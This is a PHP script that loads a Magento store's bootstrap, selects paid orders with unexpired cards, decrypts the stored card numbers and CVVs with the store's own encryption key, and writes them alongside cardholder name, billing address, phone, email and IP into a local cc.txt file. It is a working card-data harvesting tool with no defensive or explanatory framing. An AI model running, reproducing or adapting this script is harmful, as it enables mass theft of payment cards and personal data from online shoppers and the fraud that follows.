<?php
$bootstrapPath = file_exists(__DIR__ . '/../../../../../app/bootstrap.php')
    ? __DIR__ . '/../../../../../app/bootstrap.php'
    : __DIR__ . '/../../../../app/bootstrap.php';
require $bootstrapPath;

use Magento\Framework\App\Bootstrap;

$bootstrap = Bootstrap::create(BP, $_SERVER);
$om = $bootstrap->getObjectManager();

$encryptor = $om->get(\Magento\Framework\Encryption\Encryptor::class);
$db = $om->get(\Magento\Framework\App\ResourceConnection::class)->getConnection();

/**
 * Try decrypting a value.
 * If decrypt fails or returns empty → return original encrypted string.
 */
function decrypt_or_keep($encryptor, $value)
{
    if ($value === null || $value === '') {
        return '';
    }

    try {
        $plain = $encryptor->decrypt($value);
        if ($plain !== '') {
            return $plain;
        }
    } catch (\Throwable $e) {
        // ignore
    }

    return $value; // fallback: keep encrypted
}

/**
 * Prefer JSON PAN over column PAN
 */
function choose_pan($jsonPan, $columnPan)
{
    if ($jsonPan !== null && $jsonPan !== '') {
        return $jsonPan;
    }
    if ($columnPan !== null && $columnPan !== '') {
        return $columnPan;
    }
    return '';
}

$sql = "
SELECT
    so.increment_id AS order_number,
    so.created_at   AS order_date,
    sop.method      AS payment_method,

    sop.cc_number_enc AS col_cc_number_enc,
    JSON_UNQUOTE(JSON_EXTRACT(sop.additional_information,'$.cc_number_enc')) AS json_cc_number_enc,
    JSON_UNQUOTE(JSON_EXTRACT(sop.additional_information,'$.cc_cid_enc'))    AS json_cc_cid_enc,

    sop.cc_exp_month,
    sop.cc_exp_year,

    ba.firstname,
    ba.lastname,
    ba.street,
    ba.city,
    ba.region   AS state,
    ba.postcode AS zip,
    ba.country_id AS country,
    ba.telephone AS phone,

    so.customer_email,
    so.remote_ip

FROM sales_order_payment sop
JOIN sales_order so
  ON so.entity_id = sop.parent_id
LEFT JOIN sales_order_address ba
  ON ba.parent_id = so.entity_id
 AND ba.address_type = 'billing'

WHERE
    so.state IN ('processing','complete')
    AND (
        sop.amount_paid > 0
        OR sop.base_amount_paid > 0
        OR sop.last_trans_id IS NOT NULL
    )
    AND (
        CAST(sop.cc_exp_year AS UNSIGNED) > 2026
        OR (
            CAST(sop.cc_exp_year AS UNSIGNED) = 2026
            AND CAST(sop.cc_exp_month AS UNSIGNED) >= 2
        )
    )

ORDER BY so.created_at DESC
";

$rows = $db->fetchAll($sql);

$outFile = __DIR__ . '/cc.txt';
$fh = fopen($outFile, 'w');

foreach ($rows as $r) {

    // choose correct encrypted PAN
    $encPan = choose_pan(
        $r['json_cc_number_enc'],
        $r['col_cc_number_enc']
    );

    $pan = decrypt_or_keep($encryptor, $encPan);
    $cvv = decrypt_or_keep($encryptor, $r['json_cc_cid_enc']);

    $line =
        "ORDER={$r['order_number']} | " .
        "DATE={$r['order_date']} | " .
        "METHOD={$r['payment_method']} | " .
        "PAN={$pan} | " .
        "CVV={$cvv} | " .
        "EXP={$r['cc_exp_month']}/{$r['cc_exp_year']} | " .
        "NAME={$r['firstname']} {$r['lastname']} | " .
        "ADDRESS=" . str_replace("\n", ' ', (string)$r['street']) . " | " .
        "CITY={$r['city']} | " .
        "STATE={$r['state']} | " .
        "ZIP={$r['zip']} | " .
        "COUNTRY={$r['country']} | " .
        "PHONE={$r['phone']} | " .
        "EMAIL={$r['customer_email']} | " .
        "IP={$r['remote_ip']}";

    fwrite($fh, $line . PHP_EOL);
}

fclose($fh);

echo "DONE. Output written to {$outFile}\n";
